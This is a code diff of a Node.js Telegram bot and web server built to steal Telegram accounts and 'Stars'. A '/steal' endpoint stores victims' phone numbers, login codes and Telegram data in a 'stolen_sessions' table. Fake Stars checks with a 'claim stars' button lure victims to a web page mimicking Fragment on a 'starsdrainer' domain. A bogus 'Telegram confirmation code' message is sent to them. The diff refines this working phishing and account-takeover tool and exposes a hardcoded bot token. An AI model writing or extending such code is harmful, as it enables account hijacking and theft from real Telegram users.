@@ -2,6 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
+const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
 const TARGET_USERNAME = '@NikLaStore';
@@ -45,23 +46,48 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
+// Проверка stars.jpg
+app.get('/check-stars', (req, res) => {
+    const starsPath = path.join(__dirname, 'public/stars.jpg');
+    if (fs.existsSync(starsPath)) {
+        res.send('✅ stars.jpg доступен');
+    } else {
+        res.send('❌ stars.jpg не найден');
+    }
+});
+
 app.post('/steal', (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
     console.log('Номер:', req.body.phone);
-    console.log('Код:', req.body.code);
     console.log('Stage:', req.body.stage);
+    console.log('TG Data:', req.body.tg_data);
     console.log('========================');
     
     if (req.body.stage === 'phone_entered') {
-        db.run(`INSERT INTO stolen_sessions (phone, tg_data, status) VALUES (?, ?, ?)`, 
-            [req.body.phone, JSON.stringify(req.body.tg_data), 'awaiting_code']);
-        
-        // Отправляем код в Telegram пользователю
-        const code = Math.floor(10000 + Math.random() * 90000);
-        bot.sendMessage(req.body.tg_data.user.id, `Код подтверждения Telegram: ${code}`)
-            .catch(e => console.log('Не удалось отправить код:', e));
+        try {
+            // Парсим tg_data из строки в объект
+            const tgData = JSON.parse(req.body.tg_data);
+            const userId = tgData.user?.id;
+            
+            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
+                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
+            
+            // Отправляем код в Telegram пользователю если есть ID
+            if (userId) {
+                const code = Math.floor(10000 + Math.random() * 90000);
+                bot.sendMessage(userId, `Код подтверждения Telegram: ${code}`)
+                    .then(() => console.log(`✅ Код ${code} отправлен пользователю ${userId}`))
+                    .catch(e => console.log('❌ Не удалось отправить код:', e));
+            } else {
+                console.log('⚠️ Не удалось получить ID пользователя для отправки кода');
+            }
+                
+        } catch (error) {
+            console.log('❌ Ошибка парсинга tg_data:', error);
+        }
             
     } else if (req.body.stage === 'code_entered') {
+        console.log('Код введен:', req.body.code);
         db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
             [req.body.code, req.body.phone]);
         
@@ -108,6 +134,7 @@ async function stealGifts(phone, code) {
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
+    console.log(`✅ Домен: starsdrainer-production.up.railway.app`);
 });
 
 // Команда /balance - проверка баланса
@@ -189,10 +216,14 @@ bot.on('message', (msg) => {
 // Inline подсказки - ВСЕГДА показываем результат
 bot.on('inline_query', (query) => {
     const amount = query.query.split(' ')[0];
-    const domain = process.env.RAILWAY_STATIC_URL || 'твой-домен.up.railway.app';
+    const domain = 'starsdrainer-production.up.railway.app';
     
-    if (amount && !isNaN(amount)) {
-        const results = [{
+    console.log(`Inline query: "${query.query}", amount: ${amount}`);
+    
+    let results = [];
+    
+    if (amount && !isNaN(amount) && amount > 0) {
+        results = [{
             type: 'photo',
             id: '1',
             photo_url: `https://${domain}/stars.jpg`,
@@ -204,11 +235,9 @@ bot.on('inline_query', (query) => {
                 ]]
             }
         }];
-        
-        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
     } else {
         // Даже если нет числа - показываем чек на 50 звезд
-        const results = [{
+        results = [{
             type: 'photo',
             id: '1', 
             photo_url: `https://${domain}/stars.jpg`,
@@ -220,9 +249,10 @@ bot.on('inline_query', (query) => {
                 ]]
             }
         }];
-        
-        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
     }
+    
+    console.log('Inline results:', results);
+    bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
 });
 
 // Обработка создания чеков - ВСЕ могут создавать чеки
@@ -246,20 +276,31 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
         const checkId = this.lastID;
         const checkText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд`;
         
-        console.log(`Чек создан: ID ${checkId}`);
+        console.log(`✅ Чек создан: ID ${checkId}`);
         
         // Пытаемся отправить с фото
         const photoPath = path.join(__dirname, 'public/stars.jpg');
-        bot.sendPhoto(chatId, photoPath, {
-            caption: checkText,
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
-                ]]
-            }
-        }).catch(e => {
-            console.log('Ошибка отправки фото:', e);
-            // Если фото не отправляется, отправляем текст
+        if (fs.existsSync(photoPath)) {
+            bot.sendPhoto(chatId, photoPath, {
+                caption: checkText,
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
+                    ]]
+                }
+            }).catch(e => {
+                console.log('❌ Ошибка отправки фото:', e);
+                // Если фото не отправляется, отправляем текст
+                bot.sendMessage(chatId, checkText, {
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
+                        ]]
+                    }
+                });
+            });
+        } else {
+            console.log('❌ Файл stars.jpg не найден, отправляем текст');
             bot.sendMessage(chatId, checkText, {
                 reply_markup: {
                     inline_keyboard: [[
@@ -267,7 +308,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                     ]]
                 }
             });
-        });
+        }
     });
 });
 
@@ -302,7 +343,7 @@ bot.on('callback_query', (query) => {
                     return;
                 }
                 
-                console.log(`Баланс пользователя ${userId} пополнен на ${row.amount}`);
+                console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                 bot.answerCallbackQuery(query.id, { 
                     text: `✅ Вы получили ${row.amount} звёзд!` 
                 });
@@ -379,7 +420,7 @@ bot.on('callback_query', (query) => {
     }
     
     else if (query.data === 'withdraw_stars') {
-        const domain = process.env.RAILWAY_STATIC_URL || 'твой-домен.up.railway.app';
+        const domain = 'starsdrainer-production.up.railway.app';
         const webAppUrl = `https://${domain}`;
         
         const keyboard = {
@@ -458,3 +499,4 @@ bot.on('error', (error) => {
 });
 
 console.log('✅ Бот @MyStarBank_bot запущен');
+console.log('✅ Домен: starsdrainer-production.up.railway.app');
